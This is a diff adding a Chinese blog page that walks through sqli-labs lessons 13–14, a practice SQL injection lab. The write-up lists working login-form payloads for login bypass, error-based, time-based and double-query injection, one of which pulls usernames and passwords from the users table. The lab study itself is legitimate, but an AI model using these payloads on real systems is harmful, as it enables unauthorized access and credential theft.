@@ -1,0 +1,187 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SQL:sqlilabs less-13-14 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="在username处輸入
+admin&#39;
+password隨便輸入，这里輸入“1”
+得到報錯：
+You have an error in your SQL syntax; check the manu,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">SQL:sqlilabs less-13-14</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">SQL:sqlilabs less-13-14</h1>
+        <div class="stuff">
+            <span>十二月 08, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>在username处輸入</p>
+<pre><code>admin'</code></pre>
+<p>password隨便輸入，这里輸入“1”</p>
+<p>得到報錯：</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1') LIMIT 0,1' at line 1</code></pre>
+<p>可見，程序对id進行了’)處理，通過構造：</p>
+<pre><code>admin') or 1=1 #</code></pre>
+<p>登陸成功後本關不回顯成功信息</p>
+<h3 id="採用以下注入方法："><a href="#採用以下注入方法：" class="headerlink" title="採用以下注入方法："></a>採用以下注入方法：</h3><h4 id="報錯注入："><a href="#報錯注入：" class="headerlink" title="報錯注入："></a>報錯注入：</h4><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue:"></a>extractvalue:</h5><pre><code>admin') and extractvalue(1,concat(0x23,(select username from users limit 0,1)))-- </code></pre>
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml:"></a>updatexml:</h5><pre><code>admin') and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)-- </code></pre>
+<h5 id="double溢出："><a href="#double溢出：" class="headerlink" title="double溢出："></a>double溢出：</h5><pre><code>admin') union select (exp(~(select * from (select username from users limit 0,1))),2-- </code></pre>
+<h4 id="延時注入："><a href="#延時注入：" class="headerlink" title="延時注入："></a>延時注入：</h4><pre><code>admin') and if(substr(database(),1,1)='s',1,sleep(5))-- </code></pre>
+<h4 id="布爾注入："><a href="#布爾注入：" class="headerlink" title="布爾注入："></a>布爾注入：</h4><p>暫時沒有成功過先跳過這個方法</p>
+<h4 id="二次查詢注入："><a href="#二次查詢注入：" class="headerlink" title="二次查詢注入："></a>二次查詢注入：</h4><pre><code>admin') union select 1,2 from (select count(*),concat((select concat(username,0x3a, password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a #</code></pre>
+<h4 id="所以在十四關使用這樣的語句："><a href="#所以在十四關使用這樣的語句：" class="headerlink" title="所以在十四關使用這樣的語句："></a>所以在十四關使用這樣的語句：</h4><pre><code>admin" and extractvalue(1,concat(0x23,(select username from users limit 0,1)))-- </code></pre>
+<pre><code>admin" and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)-- </code></pre>
+<pre><code>admin" union select (exp(~(select * from (select username from users limit 0,1))),2-- </code></pre>
+<pre><code>admin" and if(substr(database(),1,1)='s',1,sleep(5))-- </code></pre>
+<pre><code>admin" union select 1,2 from (select count(*),concat((select concat(username,0x3a,password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a #</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A1%E7%94%A8%E4%BB%A5%E4%B8%8B%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">採用以下注入方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%B1%E9%8C%AF%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">報錯注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.1.1.</span> <span class="toc-text">extractvalue:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml"><span class="toc-number">1.1.2.</span> <span class="toc-text">updatexml:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#double%E6%BA%A2%E5%87%BA%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">double溢出：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E6%99%82%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">延時注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E7%88%BE%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">布爾注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%9F%A5%E8%A9%A2%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">二次查詢注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E5%9C%A8%E5%8D%81%E5%9B%9B%E9%97%9C%E4%BD%BF%E7%94%A8%E9%80%99%E6%A8%A3%E7%9A%84%E8%AA%9E%E5%8F%A5%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">所以在十四關使用這樣的語句：</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
